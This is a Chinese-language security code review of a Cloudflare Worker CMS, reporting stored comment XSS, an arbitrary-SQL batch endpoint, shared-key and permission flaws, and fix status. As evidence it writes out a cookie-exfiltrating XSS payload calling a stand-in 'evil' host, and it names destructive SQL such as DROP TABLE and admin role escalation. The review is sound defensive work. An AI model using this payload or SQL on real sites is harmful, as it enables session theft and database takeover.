# Worker 侧 CMS 代码审查（2026-10-19）

> 范围：`worker/src/` 全部 19 个模块（8,630 行，其中 `routes.js` 与 `routes.template.js` 是生成关系，实际约 7,400 行）+ `worker/static/admin/app.js`（2,720 行）。
> 方法：静态阅读 + 线上实测 + 攻击路径推演。**本轮只评估，不改代码。**
> 已排除：`cf-docs/`（独立项目）、`worker/static/` 里的第三方 vendor。

---

## 0. 结论摘要

| 级别 | 数量 | 一句话 |
|---|---|---|
| **P0 可被外部利用** | 2 | 评论正文存储型 XSS；`/d1-batch` 任意 SQL + 单一共享密钥 |
| **P1 权限/密钥设计** | 4 | 密钥不分离；文章改删无归属校验；设置可被 editor 读；密钥比较非恒定时间 |
| **P2 健壮性/断言** | 6 | 评论递归无深度上限；markdown 不消毒；响应头写入可能抛错；大文件全量入内存；子请求预算；`||` 兜底掩盖错误 |
| **P3 冗余** | 5 | 转义函数 4 份；密钥校验 8 处重复；3 个 no-op 兼容函数；双份路由文件；废弃端点注释残留 |

**总体评价**：代码质量高于一般个人项目——权限门禁集中在一处、SQL 基本全参数化、路径穿越有段级校验、限速有意识。问题集中在**两个设计选择**上：① 评论正文被当作"可信 HTML"直接输出；② 用一个共享密钥同时守护 JWT 与任意 SQL 执行。这两处不修，其余加固收益有限。

### 修复进度

| 项 | 状态 | 版本 | 说明 |
|---|---|---|---|
| P0-1 评论正文 XSS | ✅ 已修复 | `664fd334` | 渲染时转义 + 换行转 `<br>` |
| P2-1 评论树无深度上限 | ✅ 已修复 | `664fd334` | 渲染层 `MAX_DEPTH=6` 平铺兜底；入库层校验 parent 存在/同文章/不超深 |
| P0-2 `/d1-batch` 任意 SQL | ⏸ 暂缓 | — | 与 WP 后台 / 第三方编辑器对接在用，先不动 |

---

## 1. P0：可被外部直接利用

### P0-1　评论正文存储型 XSS（前台）　✅ 已修复（`664fd334`）

> **修复方式**：新增 `escCommentText()` = `escHtml` + `\n`→`<br>`，`renderOne`（现拆为 `renderFields`）里
> `{{COMMENT_CONTENT}}` 改走它。入库端**未加消毒**——按"评论就是纯文本"的结论，渲染时转义已经足够；
> 将来若放开富文本，消毒必须放在入库前。
> **线上实测**：临时插入 8 条测试评论（含 XSS 载荷 / 换行 / 6 层嵌套）→ 全部按预期转义并渲染 → 已清理，
> 评论总数回到 66 approved + 7 pending，全部 `origin='wp'`。
> **兼容性**：已审核的 66 条里 0 条含 HTML（此前统计的"1 条"是 WordPress 示例评论，不在已发布文章上），
> 因此没有任何现存评论会显示成字面标签。

**证据链**

| 环节 | 位置 | 行为 |
|---|---|---|
| 入库 | `comments.js:268` | 只校验非空、长度 ≤5000、字数 ≥2、链接数 ≤2 |
| 入库 | `comments.js:289` | 原样 `INSERT`，**无任何 HTML 过滤/转义** |
| 渲染 | `comments.js:157` | `h = rep(h, '{{COMMENT_CONTENT}}', String(c.content \|\| ''))` —— **直接插入** |
| 对比 | `comments.js:146-152` | 同函数里 `author` / `date` / `avatar` 全部走 `escHtml` / `escAttr`，**唯独正文没有** |
| 后台 | `app.js:2192` | 审核列表用 `.replace(/<[^>]*>/g,'')` 剥标签，管理员**看不出**恶意内容 |

**可利用性**：载荷 `<img src=x onerror="fetch('//evil/'+document.cookie)">` 长度远小于 5000、不含 `http://`（绕过链接计数），可通过全部校验。

**触发条件**
- `site.comments.accept === 'auto'` ⇒ 立即对所有访客执行；
- 默认 `'off'`（`site.js:107`）⇒ 评论进入待审核，**管理员审核通过后**对所有访客执行。而审核界面显示纯文本，管理员没有判断依据。

**影响**：访客会话被劫、可植入任意钓鱼/挖矿脚本、可篡改页面内容。若站点挂了 AdSense 之类第三方，还可能被判定为恶意站点。

**根因**：把"评论允许 HTML"当成了需求，但没有实现白名单消毒（WordPress 用 kses 做这件事）。当前是"要么全放行，要么全转义"的二选一，代码选错了。

**修复方向（有实测依据，推荐第 1 种）**

线上实测：`comments` 表 **66 条已审核 + 7 条待审核**，其中**只有 1 条含 HTML**，内容是 WordPress 自带的示例评论
（`Hi, this is a comment.<br />To delete a comment, just log in and view the post&#…`），其余 65 条全是纯文本。

⇒ **评论的真实形态是纯文本**，不需要富文本能力。所以：

1. **渲染时 `escHtml(content)`，再把 `\n` 换成 `<br>`**（一行改动，零风险）。
   代价：那条示例评论会显示成 `<br />` 字面量——它本来就是 WP 的占位垃圾，顺手删掉即可。
2. 若将来确实要富文本：入库前白名单消毒（只留 `b/i/a/code/pre/blockquote`，`a` 强制 `rel="nofollow ugc noopener"`）。
3. 若要做 markdown：`marked` + 消毒（改动最大）。

> 附带：`md.js:8` 的 `marked.parse` **默认不消毒**，任何走 `mdToHtml` 的用户输入都继承同一风险。
> 当前 `mdToHtml` 只用于**文章正文**（`admin.js:639`、`documents.js:341`）——受信作者，风险低。
> 但它一旦被复用到评论/留言就会扩散，所以消毒应在 `md.js` 内部做，而不是指望每个调用方自觉。

---

### P0-2　`/d1-batch` 可执行任意 SQL，且只用单一共享密钥守护

**证据**

```js
// routes.js:355-372
if (path === '/d1-batch' && request.method === 'POST') {
    const providedKey = request.headers.get('X-Auth-Key');
    const validKey = env.AUTH_KEY_SECRET;
    if (!providedKey || !validKey || providedKey !== validKey) return 401;
    const statements = payload.statements.slice(0, 200);
    ...
    const stmt = env.D1_DATABASE.prepare(sql);   // ← sql 完全来自请求体
```

**问题**
- 无语句类型白名单：`DROP TABLE`、`SELECT * FROM users`（读密码哈希）、`UPDATE users SET role='admin'` 全部可执行；
- 无库/表限制：一次请求可改写任意表；
- 密钥是**静态共享密钥**，写死在 WP 设置页与 Worker env 两处，一旦泄漏（日志、截图、仓库）即全库沦陷；
- 同一密钥还用于 `/upload`、`/delete`、`/purge-cache`、`/sync/*`，共 **8 处**重复校验（`routes.js:132/158/184/232/312/356/989` 等）。

**为什么当初这么做**：WP 插件导出时要把整篇文章的多条 SQL 打包成一次请求，逐条 HTTP 太慢。这是合理的性能诉求，但实现方式把"批量"和"任意"混为一谈了。

**修复方向**
1. 拆成**具名端点**（`/sync/post`、`/sync/taxonomy`），服务端拼 SQL，客户端只传数据——彻底消除任意 SQL；
2. 若必须保留通用批量：加语句白名单（只允许 `INSERT/UPDATE ... posts|taxonomies|post_taxonomy`），拒绝 `DROP/ALTER/PRAGMA/ATTACH`，并禁止触碰 `users`/`settings`；
3. 密钥分离（见 P1-1），并改为 constant-time 比较。

---

## 2. P1：权限与密钥设计

### P1-1　JWT 签名密钥与写通道密钥复用同一个 `AUTH_KEY_SECRET`

`auth.js:5` 自己写着：「复用 env.AUTH_KEY_SECRET（站点级秘密；**生产建议独立 Secret**）」。

后果：
- 拿到写通道密钥 ⇒ 可自行签发任意 `role:'admin'` 的 JWT，完全绕过登录；
- 反之，JWT 密钥轮换会同时打断 WP 插件的同步通道。

**修复**：拆成 `JWT_SECRET` 与 `SYNC_KEY` 两个 Secret；JWT 加 `iss`/`aud` 校验（当前 `verifyJwt` 只验签名与 `exp`，不验 `iss`/`aud`/`alg` 头）。

> 注：不校验 `alg` 头本身不会导致 `alg:none` 攻击——实现里固定用 HMAC verify，不读 header 的 alg。但显式校验是防未来改动的护栏。

---

### P1-2　文章 PUT / DELETE 没有归属校验，`author` 角色名存实亡

**证据**
- `admin.js:1698` `PUT /api/posts/{id}`：`SELECT * FROM posts WHERE wp_id = ?` → 直接更新，**不判断当前用户是否作者**；
- `admin.js:1728` `DELETE /api/posts/{id}`：同样无校验；
- `schema.sql:18-33`：`posts` 表**根本没有 `author_id` 字段**，只有 `settings.defaultAuthor` 一个全站默认作者。

**后果**
- `editor` 与 `author` 实际权限相同，都能改删**任何人的**文章；
- 结合 P0-1 的 XSS 可形成提权链：author 改一篇管理员常编辑的文章 → 插入 `<img onerror>` → 管理员打开编辑器（`app.js:487` `edBody.innerHTML = p.content`）→ 脚本在管理员会话里执行。

**修复**：`posts` 加 `author_id`，写操作校验 `role==='admin' || row.author_id===authPayload.sub`；后台编辑器渲染文章内容时对 `<script>`/事件属性做消毒（富文本编辑器需要 HTML，但不需要可执行脚本）。

---

### P1-3　`GET /api/settings` 未纳入 adminOnly，editor 可读全部站点设置

`admin.js:986` 的 `adminOnly` 只在 `isWrite` 时把 `/api/settings` 算进去，所以 GET 对 editor/author 开放。

设置里包含：`docRoutes`（文档库映射）、`comments` 配置、`headExtra`（可注入任意 head 片段）、`menu`、`social` 等。其中 `headExtra` 若被 editor 读到不算致命，但**若将来把任何凭据类配置写进 settings，就会直接泄漏**。

**修复**：`/api/settings` 的 GET 也纳入 adminOnly；若前端需要部分只读配置，单独开 `/api/site-public`。

---

### P1-4　密钥比较用 `!==`，不是恒定时间

8 处 `providedKey !== validKey`。理论上可做时序侧信道，实际受网络抖动影响几乎不可利用，但这是**零成本的修正**（已有 `timingSafeEqualStr` 在 `auth.js:23`，直接复用即可）。

---

## 3. P2：健壮性与不合理断言

### P2-1　评论树递归没有深度上限　✅ 已修复（`664fd334`）

`comments.js:173` `renderTree` 每层 `depth + 1` 递归，**无最大深度检查**。`createComment` 也不校验 `parent` 是否存在、是否成环。

构造一条 1000 层嵌套的评论（每次 `parent` 指向刚建的评论）⇒ 渲染单页时递归爆栈 ⇒ **整篇文章 500**，且因为每次请求都重新渲染，等于持续不可用。

**修复**：`depth > 8` 时截断（多余的挂到第 8 层），入库时校验 parent 存在且 `parent.depth < 8`。

> **实际做法**（比原建议更保守）：`MAX_DEPTH = 6`。到顶后**不截断丢弃**，而是把整棵子树按 BFS
> **平铺**到当前层（迭代 + `guard<500`，环数据也不会死循环）——评论一条不丢，版面不再缩进。
> 入库端：parent 必须存在且 `post_id` 相同（否则跨文章串树），`ancestorDepth >= MAX_DEPTH` 时降级为顶层；
> 所有异常都**降级处理而非报错**，读者不该因为层级问题被拒。
> **实测**：200 层链一次渲染 <1000ms 且 200 条全上屏；环数据（a→b→a）正常返回不挂起。

### P2-2　`index.js:8` 直接写响应头，可能抛错并掩盖真实响应

```js
const response = await handleRequest(request, env);
response.headers.set('X-Response-Time', ...);   // 若 headers 不可变（如 101/204/重定向内部对象）会抛
```

抛错后被外层 catch 捕获，返回 500 —— **原本正常的响应被替换成错误页**。当前线上没触发，属于潜在雷。

**修复**：`try { ... } catch {}` 包住，或用 `new Response(response.body, response)` 重建。

### P2-3　`storage.getFromR2` 用 `arrayBuffer()` 全量读入内存

`storage.js:10` 把整个对象读成 ArrayBuffer。对大文件（视频、几十 MB 的图）不友好，Worker 内存 128 MB 上限下并发几个就会 OOM。

**修复**：直接返回 `object.body`（流），由调用方决定是否 `text()`/`arrayBuffer()`。

### P2-4　`/d1-batch` 的子请求预算没有对齐限额

一次最多 200 条语句，每条 `prepare().all()` 是 1 次 D1 子请求。免费版 Worker 每请求 50 次子请求上限 ⇒ **超过 50 条的批次必然中途失败**，而失败点在第 51 条，前面的已写入 ⇒ 部分成功、状态不一致。

**修复**：把批次上限压到 40（留余量），或改用 D1 的 `batch()`（一次子请求执行多条）。

### P2-5　大量 `||` 兜底把真实错误变成静默降级

典型：`parseInt(x, 10) || 0`、`catch (e) { /* 忽略 */ }`（全项目 34 处）、`getFromR2` 失败返回 `null` 后调用方当"文件不存在"处理。

后果：R2 短暂故障、D1 超时、字段类型错误，全都表现为"内容为空/默认值"，**线上出问题时日志里只有一行 console.error，无法定位是"真的没有"还是"读失败了"**。

**建议**：区分「不存在」与「读取失败」两种返回（如 `{ ok:false, reason:'error' }`），至少在关键路径（单页读取、设置读取）上做。

### P2-6　`site.js` 的设置读取把三个 key 拼进 `IN (...)` 字符串

`site.js:175` `"SELECT k, v FROM settings WHERE k IN (" + keys + ")"`。`keys` 由内部常量拼成（`'site','cache','style'` 或加 `'site:<lang>'`），`lang` 经过 `normLang` 白名单过滤，**当前安全**。但这是全项目唯一一处非参数化且拼接变量名的 SQL，属于"现在对、以后容易改错"的类型，建议改成 `IN (?,?,?)`。

---

## 4. P3：冗余与可维护性

| # | 问题 | 位置 | 说明 |
|---|---|---|---|
| P3-1 | 转义函数 4 份 | `admin.js` / `comments.js` / `documents.js` 各一份 `escHtml`，`site.js` / `preview.js` 各一份 `esc` | 语义应一致（都只转 `& < >`），`preview.js` 那份还转 `"`。抽到 `html.js` 统一 |
| P3-2 | `ifBlock` / `rep` 各 2+ 份 | `comments.js`、`documents.js`、`template-engine.js`、`admin.js` | 占位符替换是本项目核心机制，四份实现迟早分叉 |
| P3-3 | 密钥校验 8 处重复 | `routes.js` 多处 | 抽成 `requireSyncKey(request, env)` 一个函数，顺带统一成恒定时间比较 |
| P3-4 | 3 个 no-op 兼容函数 | `admin.js:126` / `191` / `227` | 注释写"已废弃/保留调用点"。既然调用点还在，应连调用点一起删，否则读代码的人会以为它们有作用 |
| P3-5 | `routes.js` 与 `routes.template.js` 双份 | 各 1,191 行 | **生成关系**：插件部署时会用模板覆盖 `routes.js`。手改 `routes.js` 会被静默丢弃——这是个容易踩的坑，应在文件头大字标注（目前只在顶部写了一行） |

---

## 5. 做对了的地方（不需要动）

审查中确认以下设计是合理的，改动时别把它们改坏：

- **权限门禁集中在一处**（`admin.js:981-1000`），而不是散落在每个端点，可读性好；
- **SQL 基本全参数化**，唯一的两处拼接（`ORDER BY sortCol`、`UPDATE SET sets.join`）都有白名单/常量来源；
- **路径穿越防护**在 `documents.js:93` 做了段级校验（拒绝空段/`.`/`..`），并解释了"段内连续点是允许的"——这个细节很多实现会做错；
- **限速三处齐全**（登录 10 次/分、账号失败锁定、写操作 90 次/分），且明确接受"isolate 级、多实例各自计数"的取舍；
- **JWT 用 WebCrypto HMAC + 恒定时间比较**，密码用 PBKDF2-SHA256 且校验迭代次数上限；
- **评论反垃圾三重**（蜜罐 / 最小停留 / 链接计数），成本极低；
- **`r2key.js` 的编码规范**写得很清楚（URL 形态 vs 存储形态），还标注了"不要对已是 key 的输入再解码"。

---

## 6. 建议修复顺序

**第一批（安全，1–2 小时，风险低）**
1. P0-1 评论正文转义（`comments.js:157` 一行 + 可选消毒）
2. P1-4 密钥恒定时间比较（复用 `timingSafeEqualStr`）
3. P1-3 `/api/settings` GET 纳入 adminOnly
4. P2-2 响应头写入包 try/catch

**第二批（设计，半天，需回归）**
5. P0-2 `/d1-batch` 加语句白名单 + 密钥分离（P1-1）
6. P2-4 批次上限压到 40 或改 `batch()`
7. P2-1 评论深度上限

**第三批（结构，1–2 天）**
8. P1-2 `posts.author_id` + 归属校验 + 编辑器内容消毒
9. P3-1/2 抽出 `html.js` 与 `tpl-render.js`，消除四份重复实现
10. P3-4 删 no-op 函数及其调用点

**不建议现在做**：P2-5 的错误分类改造（收益真实但会牵动几乎所有调用点，等有实际线上故障再动）。

---

## 7. 一个结构性观察

`admin.js` 3,297 行、`routes.js` 1,191 行，两个文件合计占全部代码的 60%。`docs/main-file-split-plan.md` 里已有拆分计划，但从本次审查看，**拆分不是最紧迫的事**——真正的痛点是：

- 同一个概念（转义、占位符替换、密钥校验）有 2–4 份实现，改一处容易漏三处；
- `admin.js` 里 API 路由与业务逻辑混在一起，`/api/posts` 的 PUT 处理函数有 30 多行，包含 slug 查重、taxonomy 同步、单页重建、列表清缓存四件事，其中任何一步失败都会留下不一致状态（没有事务）。

如果要排优先级：**先消重复（P3-1/2/3），再谈拆文件**。重复是 bug 的温床，拆文件只是让代码更好看。
